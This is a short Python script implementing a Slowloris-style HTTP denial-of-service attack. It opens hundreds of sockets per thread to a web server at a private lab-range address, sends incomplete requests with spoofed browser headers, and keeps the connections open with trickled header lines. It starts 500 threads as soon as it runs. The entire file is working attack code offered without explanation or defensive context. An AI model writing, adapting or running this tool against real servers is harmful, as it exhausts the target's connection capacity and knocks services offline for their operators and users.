import socket
import time
import random
import threading

ip = "192.168.56.102"
port = 80
socketsCount = 700
headers = [
    "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
    "Accept-Language: en-us,en;q=0.5"
]

def getMessage(message):
    return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

def newSocket():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(getMessage("Get /?"))
            for header in headers:
                s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            return s
        except socket.error:
            time.sleep(0.5)

def slow_attack():
    sockets = [newSocket() for _ in range(socketsCount)]
    timeout = 60 * 10
    sleep = 15
    t = time.time()
    i = 0
    while(time.time() - t < timeout):
        for s in sockets:
            try:
                s.send(getMessage("X-a: "))
                i += 1
            except socket.error:
                sockets.remove(s)
                sockets.append(newSocket())
            time.sleep(sleep/len(sockets))

def attack():
    for i in range(500):
        threading.Thread(target=slow_attack).start()

attack()

